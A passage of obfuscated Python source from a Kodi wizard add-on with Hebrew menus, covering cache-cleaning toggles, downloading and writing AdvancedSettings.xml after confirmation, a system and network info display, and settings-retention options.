		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%OO000O0O0OOOOOOO0 [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2907
		addFile ('--- ניקוי קאש בהפעלה: %s'%OO0OO00OO0O00O0OO .replace ('true',OOOO000OO0O000OOO ).replace ('false',OOOOOOOOO00OOO000 ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2908
		addFile ('--- ניקוי חבילות בהפעלה: %s'%O0O000O0000O0000O .replace ('true',OOOO000OO0O000OOO ).replace ('false',OOOOOOOOO00OOO000 ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2909
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%O0OO0O0OOO0O00O00 .replace ('true',OOOO000OO0O000OOO ).replace ('false',OOOOOOOOO00OOO000 ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2910
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2911
	addFile ('Include Video Cache in Clear Cache: %s'%O0OO000O000O000O0 .replace ('true',OOOO000OO0O000OOO ).replace ('false',OOOOOOOOO00OOO000 ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2912
	if O0OO000O000O000O0 =='true':#line:2913
		addFile ('--- Include All Video Addons: %s'%OOOO0OO000000O00O .replace ('true',OOOO000OO0O000OOO ).replace ('false',OOOOOOOOO00OOO000 ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2914
		addFile ('--- Include Bob: %s'%OOO0OOO0O0O0OOO00 .replace ('true',OOOO000OO0O000OOO ).replace ('false',OOOOOOOOO00OOO000 ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2915
		addFile ('--- Include Phoenix: %s'%O0O0O00OO0O0OOOOO .replace ('true',OOOO000OO0O000OOO ).replace ('false',OOOOOOOOO00OOO000 ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2916
		addFile ('--- Include Specto: %s'%O00O0OO000O00O000 .replace ('true',OOOO000OO0O000OOO ).replace ('false',OOOOOOOOO00OOO000 ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2917
		addFile ('--- Include Exodus: %s'%OO000O0000O00OO00 .replace ('true',OOOO000OO0O000OOO ).replace ('false',OOOOOOOOO00OOO000 ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2918
		addFile ('--- Include Salts: %s'%OOOOO000O00O000OO .replace ('true',OOOO000OO0O000OOO ).replace ('false',OOOOOOOOO00OOO000 ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2919
		addFile ('--- Include Salts HD Lite: %s'%OO000O00O0O0000OO .replace ('true',OOOO000OO0O000OOO ).replace ('false',OOOOOOOOO00OOO000 ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2920
		addFile ('--- Include One Channel: %s'%O00000O0OOO0OO0O0 .replace ('true',OOOO000OO0O000OOO ).replace ('false',OOOOOOOOO00OOO000 ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2921
		addFile ('--- Include Genesis: %s'%O000O0000OOO0000O .replace ('true',OOOO000OO0O000OOO ).replace ('false',OOOOOOOOO00OOO000 ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2922
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2923
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2924
	setView ('files','viewType')#line:2925
def advancedWindow (url =None ):#line:2927
	if not ADVANCEDFILE =='http://':#line:2928
		if url ==None :#line:2929
			O000OO0O00O000OO0 =wiz .workingURL (ADVANCEDFILE )#line:2930
			OOOO0OOO000OOOOO0 =uservar .ADVANCEDFILE #line:2931
		else :#line:2932
			O000OO0O00O000OO0 =wiz .workingURL (url )#line:2933
			OOOO0OOO000OOOOO0 =url #line:2934
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2935
		if os .path .exists (ADVANCED ):#line:2936
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2937
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2938
		if O000OO0O00O000OO0 ==True :#line:2939
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2940
			OO0OO000OOO0000O0 =wiz .openURL (OOOO0OOO000OOOOO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2941
			O0OO0O0OOOO0O0000 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO0OO000OOO0000O0 )#line:2942
			if len (O0OO0O0OOOO0O0000 )>0 :#line:2943
				for O0O0OOOOO00O00O00 ,OOOOOO00OO0OOO000 ,url ,OO000OOOOO0O0OO00 ,OOO0O00O00000OOO0 ,OOOOO00O0OO0O0000 in O0OO0O0OOOO0O0000 :#line:2944
					if OOOOOO00OO0OOO000 .lower ()=="yes":#line:2945
						addDir ("[B]%s[/B]"%O0O0OOOOO00O00O00 ,'advancedsetting',url ,description =OOOOO00O0OO0O0000 ,icon =OO000OOOOO0O0OO00 ,fanart =OOO0O00O00000OOO0 ,themeit =THEME3 )#line:2946
					else :#line:2947
						addFile (O0O0OOOOO00O00O00 ,'writeadvanced',O0O0OOOOO00O00O00 ,url ,description =OOOOO00O0OO0O0000 ,icon =OO000OOOOO0O0OO00 ,fanart =OOO0O00O00000OOO0 ,themeit =THEME2 )#line:2948
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2949
		else :wiz .log ("[Advanced Settings] URL not working: %s"%O000OO0O00O000OO0 )#line:2950
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2951
def writeAdvanced (O0OO0OOOOO0000O0O ,OOO00O00OOOO00000 ):#line:2953
	OO0OOO0O00O00O00O =wiz .workingURL (OOO00O00OOOO00000 )#line:2954
	if OO0OOO0O00O00O00O ==True :#line:2955
		if os .path .exists (ADVANCED ):O0O0O0O000O0OO00O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O0OO0OOOOO0000O0O ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2956
		else :O0O0O0O000O0OO00O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O0OO0OOOOO0000O0O ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2957
		if O0O0O0O000O0OO00O ==1 :#line:2959
			O0O0O00O000OOO0OO =wiz .openURL (OOO00O00OOOO00000 )#line:2960
			O0O00O0O00OOOOO0O =open (ADVANCED ,'w');#line:2961
			O0O00O0O00OOOOO0O .write (O0O0O00O000OOO0OO )#line:2962
			O0O00O0O00OOOOO0O .close ()#line:2963
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2964
			wiz .killxbmc (True )#line:2965
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2966
	else :wiz .log ("[Advanced Settings] URL not working: %s"%OO0OOO0O00O00O00O );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2967
def viewAdvanced ():#line:2969
	O0O000O000OOO000O =open (ADVANCED )#line:2970
	O0O0O00O0O000000O =O0O000O000OOO000O .read ().replace ('\t','    ')#line:2971
	wiz .TextBox (ADDONTITLE ,O0O0O00O0O000000O )#line:2972
	O0O000O000OOO000O .close ()#line:2973
def removeAdvanced ():#line:2975
	if os .path .exists (ADVANCED ):#line:2976
		wiz .removeFile (ADVANCED )#line:2977
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2978
def showAutoAdvanced ():#line:2980
	notify .autoConfig ()#line:2981
def getIP ():#line:2983
	OOO000000OO0O0O00 ='http://whatismyipaddress.com/'#line:2984
	if not wiz .workingURL (OOO000000OO0O0O00 ):return 'Unknown','Unknown','Unknown'#line:2985
	OOOO0O0000O0OO0O0 =wiz .openURL (OOO000000OO0O0O00 ).replace ('\n','').replace ('\r','')#line:2986
	if not 'Access Denied'in OOOO0O0000O0OO0O0 :#line:2987
		OOO0O0000O0O00O00 =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (OOOO0O0000O0OO0O0 )#line:2988
		O0O000000O00O0O00 =OOO0O0000O0O00O00 [0 ]if (len (OOO0O0000O0O00O00 )>0 )else 'Unknown'#line:2989
		OO0O0OOOO00O0O0O0 =re .compile ('"font-size:14px;">(.+?)</td>').findall (OOOO0O0000O0OO0O0 )#line:2990
		O0000O0O000O000O0 =OO0O0OOOO00O0O0O0 [0 ]if (len (OO0O0OOOO00O0O0O0 )>0 )else 'Unknown'#line:2991
		O0OO0OO0OOO0O000O =OO0O0OOOO00O0O0O0 [1 ]+', '+OO0O0OOOO00O0O0O0 [2 ]+', '+OO0O0OOOO00O0O0O0 [3 ]if (len (OO0O0OOOO00O0O0O0 )>2 )else 'Unknown'#line:2992
		return O0O000000O00O0O00 ,O0000O0O000O000O0 ,O0OO0OO0OOO0O000O #line:2993
	else :return 'Unknown','Unknown','Unknown'#line:2994
def systemInfo ():#line:2996
	O0OO0OOO0OOO000O0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:3010
	O00O0OO00OOO0O0OO =[];OOOOOO0OO0O00000O =0 #line:3011
	for OO0OO0OO0O0OO0OO0 in O0OO0OOO0OOO000O0 :#line:3012
		O000000OO00OOO00O =wiz .getInfo (OO0OO0OO0O0OO0OO0 )#line:3013
		O00000O0O000OO0OO =0 #line:3014
		while O000000OO00OOO00O =="Busy"and O00000O0O000OO0OO <10 :#line:3015
			O000000OO00OOO00O =wiz .getInfo (OO0OO0OO0O0OO0OO0 );O00000O0O000OO0OO +=1 ;wiz .log ("%s sleep %s"%(OO0OO0OO0O0OO0OO0 ,str (O00000O0O000OO0OO )));xbmc .sleep (1000 )#line:3016
		O00O0OO00OOO0O0OO .append (O000000OO00OOO00O )#line:3017
		OOOOOO0OO0O00000O +=1 #line:3018
	O0O00O0O0O0OO00O0 =O00O0OO00OOO0O0OO [8 ]if 'Una'in O00O0OO00OOO0O0OO [8 ]else wiz .convertSize (int (float (O00O0OO00OOO0O0OO [8 ][:-8 ]))*1024 *1024 )#line:3019
	O0O000O0000O0OO00 =O00O0OO00OOO0O0OO [9 ]if 'Una'in O00O0OO00OOO0O0OO [9 ]else wiz .convertSize (int (float (O00O0OO00OOO0O0OO [9 ][:-8 ]))*1024 *1024 )#line:3020
	O0O0O000OOO0OO0OO =O00O0OO00OOO0O0OO [10 ]if 'Una'in O00O0OO00OOO0O0OO [10 ]else wiz .convertSize (int (float (O00O0OO00OOO0O0OO [10 ][:-8 ]))*1024 *1024 )#line:3021
	OOOOO0O00O0O0O0OO =wiz .convertSize (int (float (O00O0OO00OOO0O0OO [11 ][:-2 ]))*1024 *1024 )#line:3022
	O000OO00000O0OO00 =wiz .convertSize (int (float (O00O0OO00OOO0O0OO [12 ][:-2 ]))*1024 *1024 )#line:3023
	O000O00OO0000OOO0 =wiz .convertSize (int (float (O00O0OO00OOO0O0OO [13 ][:-2 ]))*1024 *1024 )#line:3024
	OO0O000O0OOO0000O ,OOO000OOOOO0000O0 ,O000O00OOOOO00OOO =getIP ()#line:3025
	O0O0O0000OO00OO0O =[];OO00OO000OOO00OOO =[];OOOOOOO0OOOOOOOOO =[];OOO0000O00000O000 =[];OOO000OO0000O00OO =[];O0OOO000OO0O00OO0 =[];O0OO000000OO0O0O0 =[]#line:3027
	O00O0OOOO0O0000O0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3029
	for O00OO0O00OOOO0000 in sorted (O00O0OOOO0O0000O0 ,key =lambda OO0O0OOOO000OOO00 :OO0O0OOOO000OOO00 ):#line:3030
		OO0O00O0000000O00 =os .path .split (O00OO0O00OOOO0000 [:-1 ])[1 ]#line:3031
		if OO0O00O0000000O00 =='packages':continue #line:3032
		OO0O0OOOOO0O0OOOO =os .path .join (O00OO0O00OOOO0000 ,'addon.xml')#line:3033
		if os .path .exists (OO0O0OOOOO0O0OOOO ):#line:3034
			O00OO0OOO0OOO00O0 =open (OO0O0OOOOO0O0OOOO )#line:3035
			OOOOO00OOOOO0O00O =O00OO0OOO0OOO00O0 .read ()#line:3036
			OO0OO00OO0OO0O00O =re .compile ("<provides>(.+?)</provides>").findall (OOOOO00OOOOO0O00O )#line:3037
			if len (OO0OO00OO0OO0O00O )==0 :#line:3038
				if OO0O00O0000000O00 .startswith ('skin'):O0OO000000OO0O0O0 .append (OO0O00O0000000O00 )#line:3039
				if OO0O00O0000000O00 .startswith ('repo'):OOO000OO0000O00OO .append (OO0O00O0000000O00 )#line:3040
				else :O0OOO000OO0O00OO0 .append (OO0O00O0000000O00 )#line:3041
			elif not (OO0OO00OO0OO0O00O [0 ]).find ('executable')==-1 :OOO0000O00000O000 .append (OO0O00O0000000O00 )#line:3042
			elif not (OO0OO00OO0OO0O00O [0 ]).find ('video')==-1 :OOOOOOO0OOOOOOOOO .append (OO0O00O0000000O00 )#line:3043
			elif not (OO0OO00OO0OO0O00O [0 ]).find ('audio')==-1 :OO00OO000OOO00OOO .append (OO0O00O0000000O00 )#line:3044
			elif not (OO0OO00OO0OO0O00O [0 ]).find ('image')==-1 :O0O0O0000OO00OO0O .append (OO0O00O0000000O00 )#line:3045
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3047
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0OO00OOO0O0OO [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3048
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0OO00OOO0O0OO [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3049
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3050
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0OO00OOO0O0OO [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3051
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0OO00OOO0O0OO [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3052
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3054
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0OO00OOO0O0OO [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3055
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0OO00OOO0O0OO [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3056
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3058
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00O0O0O0OO00O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3059
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000O0000O0OO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3060
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0O000OOO0OO0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3061
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3063
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO0O00O0O0O0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3064
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000OO00000O0OO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3065
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00OO0000OOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3066
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3068
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0OO00OOO0O0OO [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3069
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O000O0OOO0000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3070
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO000OOOOO0000O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3071
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00OOOOO00OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3072
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0OO00OOO0O0OO [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3073
	O0OO00O0OOO0O0O00 =len (O0O0O0000OO00OO0O )+len (OO00OO000OOO00OOO )+len (OOOOOOO0OOOOOOOOO )+len (OOO0000O00000O000 )+len (O0OOO000OO0O00OO0 )+len (O0OO000000OO0O0O0 )+len (OOO000OO0000O00OO )#line:3075
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,O0OO00O0OOO0O0O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3076
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOOOOO0OOOOOOOOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3077
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO0000O00000O000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3078
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO00OO000OOO00OOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3079
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0O0000OO00OO0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3080
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO000OO0000O00OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3081
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OO000000OO0O0O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3082
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OOO000OO0O00OO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3083
def Menu ():#line:3084
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3085
def saveMenu ():#line:3087
	OOOOOOOO0OO0OO0O0 ='[COLOR yellow]מופעל[/COLOR]';O00000000O0OOOOO0 ='[COLOR blue]מבוטל[/COLOR]'#line:3089
	OO0OO00O0O00O0OO0 ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3090
	O000O0000O000OOOO ='true'if KEEPMOVIELIST =='true'else 'false'#line:3091
	O00OO000O00OOO0O0 ='true'if KEEPINFO =='true'else 'false'#line:3092
	OOOOOO0OO000O0O0O ='true'if KEEPSOUND =='true'else 'false'#line:3094
	O000O000OO0O0OO0O ='true'if KEEPVIEW =='true'else 'false'#line:3095
	O0O000000O0O0OOOO ='true'if KEEPSKIN =='true'else 'false'#line:3096
	OO000000O0OO0O00O ='true'if KEEPSKIN2 =='true'else 'false'#line:3097
	O0O00OO0000O00000 ='true'if KEEPSKIN3 =='true'else 'false'#line:3098
	OOO0O0O000000O0OO ='true'if KEEPADDONS =='true'else 'false'#line:3099
	OO00O0OOOO0OO00O0 ='true'if KEEPPVR =='true'else 'false'#line:3100
	OOOOOOO000O0OOOOO ='true'if KEEPTVLIST =='true'else 'false'#line:3101
	O0O0OO0O0O0OO0000 ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3102
	O0OO0OOOOO000OO00 ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3103
	O00OOO0000OOO0OO0 ='true'if KEEPHUBTV =='true'else 'false'#line:3104
	O0O0000OOO00O0O0O ='true'if KEEPHUBVOD =='true'else 'false'#line:3105
	O0O000O00O00000OO ='true'if KEEPHUBSPORT =='true'else 'false'#line:3106
	O0O00OOOOO0OO0OOO ='true'if KEEPHUBKIDS =='true'else 'false'#line:3107
	O0OO00OO0OO0OO000 ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3108
	OOOOO00OOOOO0O0OO ='true'if KEEPHUBMENU =='true'else 'false'#line:3109
	O00OO000O000OOO00 ='true'if KEEPPLAYLIST =='true'else 'false'#line:3110
	O00OOOO00O000O000 ='true'if KEEPTRAKT =='true'else 'false'#line:3111
	O0O00000O0OOO0O00 ='true'if KEEPREAL =='true'else 'false'#line:3112
	OOOO00OO000OO0000 ='true'if KEEPRD2 =='true'else 'false'#line:3113
	O000OOOOO00OO0O0O ='true'if KEEPTORNET =='true'else 'true'#line:3114
	OO0OO00O0OO0000O0 ='true'if KEEPLOGIN =='true'else 'false'#line:3115
	O0O0O0OOOO00000OO ='true'if KEEPSOURCES =='true'else 'false'#line:3116
	OOOOOO0O0O00OOOOO ='true'if KEEPADVANCED =='true'else 'false'#line:3117
	O0O0OO000O0OO000O ='true'if KEEPPROFILES =='true'else 'false'#line:3118
	OO0OO0000OO000O00 ='true'if KEEPFAVS =='true'else 'false'#line:3119
	O0000000OOO00O000 ='true'if KEEPREPOS =='true'else 'false'#line:3120
	OOO00000OOOO000OO ='true'if KEEPSUPER =='true'else 'false'#line:3121
	OOOO00O0OOOOO0OOO ='true'if KEEPWHITELIST =='true'else 'false'#line:3122
	O000OOO0OOO0O00OO ='true'if KEEPWEATHER =='true'else 'false'#line:3123
	O0OOOOO00O0OOO0OO ='true'if KEEPVICTORY =='true'else 'false'#line:3124
	OO000000OO000OOO0 ='true'if KEEPTELEMEDIA =='true'else 'false'#line:3125
	if OOOO00O0OOOOO0OOO =='true':#line:3127
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3128
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3129
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3130
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3131
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3132
	addFile ('%s שמירת חשבון RD:  '%O0O00000O0OOO0O00 .replace ('true',OOOOOOOO0OO0OO0O0 ).replace ('false',O00000000O0OOOOO0 ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3135
	addFile ('%s שמירת חשבון טראקט:  '%O00OOOO00O000O000 .replace ('true',OOOOOOOO0OO0OO0O0 ).replace ('false',O00000000O0OOOOO0 ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3136
	addFile ('%s שמירת מועדפים:  '%OO0OO0000OO000O00 .replace ('true',OOOOOOOO0OO0OO0O0 ).replace ('false',O00000000O0OOOOO0 ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3139
	addFile ('%s שמירת לקוח טלוויזיה:  '%OO00O0OOOO0OO00O0 .replace ('true',OOOOOOOO0OO0OO0O0 ).replace ('false',O00000000O0OOOOO0 ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3140
	addFile ('%s שמירת הגדרות הרחבה ויקטורי:  '%O0OOOOO00O0OOO0OO .replace ('true',OOOOOOOO0OO0OO0O0 ).replace ('false',O00000000O0OOOOO0 ),'togglesetting','keepvictory',icon =ICONTRAKT ,themeit =THEME1 )#line:3141
	addFile ('%s שמירת חשבון טלמדיה:  '%OO000000OO000OOO0 .replace ('true',OOOOOOOO0OO0OO0O0 ).replace ('false',O00000000O0OOOOO0 ),'togglesetting','keeptelemedia',icon =ICONTRAKT ,themeit =THEME1 )#line:3142
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%OOOOOOO000O0OOOOO .replace ('true',OOOOOOOO0OO0OO0O0 ).replace ('false',O00000000O0OOOOO0 ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3143
	addFile ('%s שמירת אריח סרטים:  '%O0O0OO0O0O0OO0000 .replace ('true',OOOOOOOO0OO0OO0O0 ).replace ('false',O00000000O0OOOOO0 ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3144
	addFile ('%s שמירת אריח סדרות:  '%O0OO0OOOOO000OO00 .replace ('true',OOOOOOOO0OO0OO0O0 ).replace ('false',O00000000O0OOOOO0 ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3145
	addFile ('%s שמירת אריח טלויזיה:  '%O00OOO0000OOO0OO0 .replace ('true',OOOOOOOO0OO0OO0O0 ).replace ('false',O00000000O0OOOOO0 ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3146
	addFile ('%s שמירת אריח תוכן ישראלי:  '%O0O0000OOO00O0O0O .replace ('true',OOOOOOOO0OO0OO0O0 ).replace ('false',O00000000O0OOOOO0 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3147
	addFile ('%s שמירת אריח ספורט:  '%O0O000O00O00000OO .replace ('true',OOOOOOOO0OO0OO0O0 ).replace ('false',O00000000O0OOOOO0 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3148
	addFile ('%s שמירת אריח ילדים:  '%O0O00OOOOO0OO0OOO .replace ('true',OOOOOOOO0OO0OO0O0 ).replace ('false',O00000000O0OOOOO0 ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3149
	addFile ('%s שמירת אריח מוסיקה:  '%O0OO00OO0OO0OO000 .replace ('true',OOOOOOOO0OO0OO0O0 ).replace ('false',O00000000O0OOOOO0 ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3150
	addFile ('%s שמירת תפריט אריחים ראשי:  '%OOOOO00OOOOO0O0OO .replace ('true',OOOOOOOO0OO0OO0O0 ).replace ('false',O00000000O0OOOOO0 ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3151
	addFile ('%s שמירת כל האריחים בסקין:  '%O0O000000O0O0OOOO .replace ('true',OOOOOOOO0OO0OO0O0 ).replace ('false',O00000000O0OOOOO0 ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3152
	addFile ('%s שמירת הגדרות מזג האוויר:  '%O000OOO0OOO0O00OO .replace ('true',OOOOOOOO0OO0OO0O0 ).replace ('false',O00000000O0OOOOO0 ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3153
	addFile ('%s שמירת הרחבות שהתקנתי:  '%OOO0O0O000000O0OO .replace ('true',OOOOOOOO0OO0OO0O0 ).replace ('false',O00000000O0OOOOO0 ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3159
